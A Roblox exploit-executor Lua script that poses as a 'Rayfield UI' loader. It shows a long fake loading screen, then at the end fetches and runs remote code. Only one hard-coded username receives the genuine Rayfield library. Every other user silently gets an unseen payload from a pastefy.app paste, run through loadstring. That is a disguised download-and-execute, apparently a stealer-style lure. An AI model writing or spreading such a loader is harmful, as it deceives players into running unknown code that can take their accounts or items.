local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")

-- Executor check (Delta not supported)
if identifyexecutor and string.lower(identifyexecutor()) == "delta" then
	local deltaBlock = Instance.new("ScreenGui", game.CoreGui)
	deltaBlock.ResetOnSpawn = false
	deltaBlock.IgnoreGuiInset = true

	local block = Instance.new("Frame", deltaBlock)
	block.Size = UDim2.new(1,0,1,0)
	block.BackgroundColor3 = Color3.new(0,0,0)

	local label = Instance.new("TextLabel", block)
	label.Size = UDim2.new(1,0,1,0)
	label.Text = "Delta is not supported RN\nPlease use another executor"
	label.TextColor3 = Color3.fromRGB(255, 0, 0)
	label.TextScaled = true
	label.Font = Enum.Font.GothamBold
	label.BackgroundTransparency = 1
	return
end

-- GUI Creation
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999

-- Blur effect
local blur = Instance.new("BlurEffect", Lighting)
blur.Size = 24

-- Main background
local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.new(0,0,0)

-- Shine effect
local shine = Instance.new("UIGradient", bg)
shine.Rotation = 45
shine.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(50,50,50)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80,80,80)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(50,50,50))
}
task.spawn(function()
	while true do
		for i = 0, 360, 1 do
			shine.Rotation = i
			RunService.RenderStepped:Wait()
		end
	end
end)

-- Title
local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(1, 0, 0.1, 0)
title.Position = UDim2.new(0, 0, 0.1, 0)
title.Text = "🌿LOADING RAYFIELD UI🪴"
title.TextColor3 = Color3.new(1,1,1)
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.BackgroundTransparency = 1

-- Loading bar container
local barBG = Instance.new("Frame", bg)
barBG.Size = UDim2.new(0.5, 0, 0.05, 0)
barBG.Position = UDim2.new(0.25, 0, 0.5, 0)
barBG.BackgroundColor3 = Color3.new(1,1,1)
barBG.BorderSizePixel = 0
barBG.ClipsDescendants = true
barBG.AnchorPoint = Vector2.new(0.5,0.5)
barBG:ApplyStrokeMode(Enum.ApplyStrokeMode.Border)
barBG.BackgroundTransparency = 0
barBG.Name = "BarBackground"

local corner = Instance.new("UICorner", barBG)
corner.CornerRadius = UDim.new(1,0)

-- Fill bar
local fill = Instance.new("Frame", barBG)
fill.BackgroundColor3 = Color3.fromRGB(0, 132, 255)
fill.Size = UDim2.new(0,0,1,0)
fill.Position = UDim2.new(0,0,0,0)
fill.BorderSizePixel = 0
Instance.new("UICorner", fill).CornerRadius = UDim.new(1,0)

-- Percent text
local percent = Instance.new("TextLabel", barBG)
percent.Size = UDim2.new(1,0,1,0)
percent.Position = UDim2.new(0,0,0,0)
percent.TextColor3 = Color3.fromRGB(180,180,180)
percent.TextScaled = true
percent.Font = Enum.Font.Gotham
percent.BackgroundTransparency = 1
percent.Text = "0%"

-- Tips below loading bar
local tips = {
	"stuck at loading bar?, reexecute",
	"MAKE SURE YOUR ON PUBLIC SERVER",
	"RAYFIELD UI NO 1",
	"Tysm for using this loader!"
}
local tipLabel = Instance.new("TextLabel", bg)
tipLabel.Position = UDim2.new(0.5,0,0.57,0)
tipLabel.AnchorPoint = Vector2.new(0.5,0)
tipLabel.Size = UDim2.new(0.6, 0, 0.05, 0)
tipLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
tipLabel.TextScaled = true
tipLabel.Font = Enum.Font.GothamSemibold
tipLabel.BackgroundTransparency = 1

task.spawn(function()
	while true do
		for _, tip in ipairs(tips) do
			tipLabel.TextTransparency = 1
			tipLabel.Text = tip
			TweenService:Create(tipLabel, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
			wait(4)
			TweenService:Create(tipLabel, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
			wait(1)
		end
	end
end)

-- Smooth loading
for i = 0, 100 do
	TweenService:Create(fill, TweenInfo.new(0.03), {
		Size = UDim2.new(i/100, 0, 1, 0)
	}):Play()
	percent.Text = i .. "%"
	wait(0.3)
end

-- Morph animation: rectangle to squirkle to circle ✅
barBG:TweenSize(UDim2.new(0.3, 0, 0.12, 0), "Out", "Back", 0.4, true)
title.Text = "UI Loaded!"
percent.Text = ""
fill.Visible = false
wait(1)

barBG:TweenSize(UDim2.new(0.15, 0, 0.15, 0), "Out", "Back", 0.4, true)
wait(0.4)

percent.Text = "✅"
percent.TextColor3 = Color3.fromRGB(0, 255, 0)
wait(1)

-- Fade out
TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
TweenService:Create(title, TweenInfo.new(1), {TextTransparency = 1}):Play()
TweenService:Create(barBG, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
TweenService:Create(percent, TweenInfo.new(1), {TextTransparency = 1}):Play()
TweenService:Create(tipLabel, TweenInfo.new(1), {TextTransparency = 1}):Play()
wait(1.2)

gui:Destroy()
blur:Destroy()

-- Final script logic
local username = Players.LocalPlayer.Name
if username == "DYLANcuriae25" then
	loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Rayfield/main/source.lua"))()
else
	loadstring(game:HttpGet("https://pastefy.app/aQd7MJ0E/raw"))()
end
